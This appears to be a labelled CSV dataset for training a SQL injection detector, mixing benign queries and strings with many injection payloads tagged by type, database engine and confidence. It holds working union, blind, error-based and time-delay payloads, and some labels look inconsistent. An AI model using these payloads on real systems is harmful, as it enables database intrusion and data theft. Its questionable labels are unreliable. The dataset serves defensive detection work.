payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
SELECT AVG ( swam ) FROM talk SELECT SUM ( today ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
"1' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --","__INT__ and char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) - -",time_blind,postgresql,0.7,True,original,bronze
"select * from users WHERE username = ""1\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
SELECT * FROM anybody WHERE full = 'buffalo' AND ( conversation = 'rhythm' OR cost = 'merely' ),select * from __IDENT__ where full = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False,original,gold
SELECT MIN ( stiff ) AS salt FROM plane,select min ( __IDENT__ ) as __IDENT__ from __IDENT__,benign,generic,1.0,False,original,gold
"1 ) ) ) union all select null,null,null,null#","__INT__ ) ) ) union all select null , null , null , null",union_based,generic,0.7,True,original,bronze
"1"" ) where 2445 = 2445",__INT__ ) where __INT__ = __INT__,benign,generic,1.0,False,original,gold
SELECT * FROM guide WHERE group = 'most' LIMIT 3,select * from __IDENT__ where group = __STR__ limit __INT__,benign,mysql,1.0,False,original,gold
select * from users where id = 1 or \.<\ or 1 = 1 -- 1,select * from __IDENT__ where __IDENT__ = __INT__ or __IDENT__ < \ or __INT__ = __INT__ - - __INT__,boolean_blind,mysql,0.85,True,original,silver
"select * from users WHERE username = ""-1254"" and username = ""1\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'pneh\' like \'pneh""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,boolean_blind,oracle,0.8,True,original,silver
select * from users where id = 1. or 1 = 1 -- 1,select * from __IDENT__ where __IDENT__ = __INT__ or __INT__ = __INT__ - - __INT__,boolean_blind,mysql,0.8,True,original,silver
"-8153' ) as qhlb where 4948 = 4948 union all select 4948,4948,4948,4948,4948,4948#","- __INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.85,True,original,silver
"select * from users WHERE username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7874 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) )",error_based,oracle,0.95,True,original,gold
"c/ sant antoni maria claret, 173","__IDENT__ / __IDENT__ __IDENT__ __IDENT__ __IDENT__ , __INT__",benign,generic,0.9,False,original,silver
UEs,__IDENT__,union_based,generic,0.8,True,original,silver
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'foju\' = \'foju"" and username = ""-4248 where 3288 = 3288","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ where __INT__ = __INT__",error_based,oracle,0.95,True,original,gold
"1'|| ( select 'ufgs' where 9670 = 9670 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",__INT__ __STR__ __IDENT__ __STR__,boolean_blind,generic,0.75,True,original,bronze
8.2197E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
schwuchow9@viajessolomujeres.bj,__IDENT__,benign,generic,0.9,False,original,silver
1' ) where 6622 = 6622 order by 1--,__INT__ ) where __INT__ = __INT__ order by __INT__ - -,error_based,mysql,0.85,True,original,silver
1 ) where 4573 = 4573,__INT__ ) where __INT__ = __INT__,benign,generic,1.0,False,original,gold
reencarnar,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.85,True,original,silver
SELECT * FROM merely,select * from __IDENT__,benign,generic,1.0,False,original,gold
1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||',__INT__ __STR__ __IDENT__ __STR__,benign,generic,1.0,False,original,gold
"INSERT INTO column ( white, does, certain, curious, first, our ) VALUES ( 'rose', 'anyone'. close', 'remove', 'force', 'feet', 'fell' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , first , __IDENT__ ) values ( __STR__ , __STR__ . __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ )",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd"" and username = ""1\' ) as wpmv where 1479 = 1479",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) as __IDENT__ where __INT__ = __INT__,error_based,postgresql,0.9,True,original,silver
"1, ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )","__INT__ , ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) )",boolean_blind,mysql,0.8,True,original,silver
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) or username = ""1\' ) where 1502 = 1502 or username = ""-7199\'","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ % \ __STR__ ) where __INT__ = __INT__ or __IDENT__ = "" - __INT__",auth_bypass,generic,0.6,True,original,bronze
"-9553"" ) as geih where 6453 = 6453 or 8453 = 8159--",- __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ - -,boolean_blind,generic,0.8,True,original,silver
UPDATE good SET trouble = 'relationship'WHERE electricity = 'excellent',update __IDENT__ set __IDENT__ = __STR__ where __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
"-1647' ) ) union all select 3030,3030,3030,3030,3030,3030,3030--","- __INT__ ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
SELECT * FROM planet FETCH FIRST 50 PERCENT ROWS ONLY,select * from __IDENT__ fetch first __INT__ __IDENT__ rows only,benign,generic,1.0,False,original,gold
"-5160' ) as kgjw where 9609 = 9609 union all select 9609,9609--","- __INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ - -",union_based,generic,0.85,True,original,silver
regla casiano,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
-4785' or ( 8459 = 8459 ) *4906 and 'esfn' = 'esfn,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.75,True,original,bronze
"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True,original,bronze
-5286' or 6783 = 1233,- __INT__ or __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
8.08498E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
vilagut victori,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'ctac' like 'ctac",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,mysql,0.7,True,original,bronze
SELECT cannot FROM half UNION SELECT curve FROM very ORDER BY machinery,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) or username = ""-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ),error_based,oracle,0.85,True,original,silver
"SELECT shutID AS ID, canal AS pile FROM bit","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
chmara@novolardiseno.ky,__IDENT__,benign,generic,0.9,False,original,silver
bularros,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM satellites WHERE studied = 'but' OR syllable = 'film',select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
"1"" ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #","__INT__ ) ) ) __IDENT__ __IDENT__ ( __IDENT__ ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , md5 ( __HEX__ ) ) ) ) ) , __INT__ ) #",error_based,mysql,0.7,True,original,bronze
SELECT DISTINCT recent FROM mysterious,select distinct __IDENT__ from __IDENT__,benign,generic,1.0,False,original,gold
SELECT * FROM setting WHERE hearing BETWEEN angry09/01/1996pay AND such15/31/1996cold,select * from __IDENT__ where __IDENT__ between __IDENT__ / __INT__ / __IDENT__ and __IDENT__ / __INT__ / __IDENT__,benign,generic,1.0,False,original,gold
SELECT height ( s ) FROM eight SELECT feed ( s ),select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ ( __IDENT__ ),benign,generic,1.0,False,original,gold
SELECT * FROM one FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ fetch first __INT__ rows only,benign,generic,1.0,False,original,gold
1%' ) ) and 7533 = 7533 and ( ( '%' = ',__INT__ % __STR__ % __STR__,benign,generic,1.0,False,original,gold
-9363%' or ( 8459 = 8459 ) *4906 and '%' = ',- __INT__ % __STR__ % __STR__,boolean_blind,generic,0.75,True,original,bronze
"1"" ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","__INT__ ) ) ) and __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,generic,0.7,True,original,bronze
SELECT * FROM pair WHERE mission BETWEEN '1996-07-01' AND '1996-07-31',select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False,original,gold
"1%"" union all select null,null,null,null--","__INT__ % "" union all select null , null , null , null - -",union_based,generic,0.7,True,original,bronze
"1 ) where 2473 = 2473 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --","__INT__ ) where __INT__ = __INT__ and __IDENT__ ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ ) , __INT__ ) - -",error_based,mysql,0.9,True,original,silver
([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME])) ([INFERENCE] AND SLEEP([SLEEPTIME])),( __IDENT__ = __IDENT__ and sleep ( __IDENT__ ) ) ( __IDENT__ and sleep ( __IDENT__ ) ),time_blind,mysql,0.9,True,original,silver
"select * from users WHERE username = ""-7199\' and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
"select * from users WHERE username = ""1\' ) and ( \'bmhw\' like \'bmhw"" or username = ""1\' ) ) and ( ( \'mmfq\' = \'mmfq"" and username = ""1\' ) as ulbr where 7233 = 7233",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and __IDENT__ = __INT__ ) as __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.85,True,original,silver
"-5235 ) or make_set ( 9354 = 9354,7185 )","- __INT__ ) or __IDENT__ ( __INT__ = __INT__ , __INT__ )",boolean_blind,mysql,0.7,True,original,bronze
"select * from users WHERE username = ""-2154%\' and \'%\' = \'"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-1549\' )","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) or __IDENT__ = "" - __INT__ )",boolean_blind,oracle,0.8,True,original,silver
"select * from users WHERE username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 or username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694"" and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' )","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ where __INT__ = __INT__ and __IDENT__ = "" - __INT__ )",error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" and username = ""-6036 ) ) ) and ( ( ( 6723 = 6723""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,auth_bypass,generic,0.9,True,original,silver
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( ""bqfj"" like ""bqfj","select benchmark ( __INT__ , md5 ( __HEX__ ) ) and ( ( ( __STR__ like __IDENT__",time_blind,mysql,0.9,True,original,silver
ulpiano,__IDENT__,benign,generic,0.9,False,original,silver
"1 ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4277 = 4277","__INT__ ) ) or __INT__ = ( select count ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) and ( ( __INT__ = __INT__",heavy_query,postgresql,0.7,True,original,bronze
SELECT * FROM population ORDER BY development DESC,select * from __IDENT__ order by __IDENT__ desc,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""1\' ) and ( \'ulkq\' = \'ulkq"" or username = ""-2962\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) ) or __INT__ = convert ( __IDENT__ , ( select char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )",boolean_blind,mssql,0.85,True,original,silver
"select * from users WHERE username = ""1\' ) ) ) and username = ""1\'|| ( select \'rjun\' where 8868 = 8868 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,mssql,0.8,True,original,silver
"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""uisi"" = ""uisi",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mysql,0.8,True,original,silver
"select * from users WHERE username = ""1\' ) ) or username = ""1\' ) ) and username = ""-4582 ) ) as gvfo where 8885 = 8885 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True,original,gold
rhett,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ | | ( select \ __STR__ from dual where __INT__ = __INT__,error_based,oracle,0.9,True,original,silver
4.43193E+015,__IDENT__ + __INT__,benign,generic,1.0,False,original,gold
FROM ( SELECT DISTINCT soldier FROM mail ),from ( select distinct __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
SELECT rose ( s FROM glass RIGHT JOIN,select __IDENT__ ( __IDENT__ from __IDENT__ right join,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""-1641\' ) ) or username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'jzpb\' = \'jzpb""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"iif ( 1878 = 2513,1,1/0 )","__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",boolean_blind,mssql,0.7,True,original,bronze
"-6595"" order by 1--",- __INT__ order by __INT__ - -,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" and username = ""-7199\' or \'qibr\' = \'qibr"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,mssql,0.8,True,original,silver
"select * from users WHERE username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ % "" and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )",error_based,postgresql,0.9,True,original,silver
"select * from users WHERE username = ""-2962\' ) ) ) and ( ( ( \'hkjo\' = \'hkjo"" and username = ""1 ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) ),auth_bypass,generic,0.9,True,original,silver
1'|| ( select 'feyg' from dual where 7734 = 7734 and 3843 = 6724#,__INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__ and __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"SELECT * FROM for WHERE silence NOT IN ( 'rise', 'roar', 'one' )","select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False,original,gold
n4que,__IDENT__,benign,generic,0.9,False,original,silver
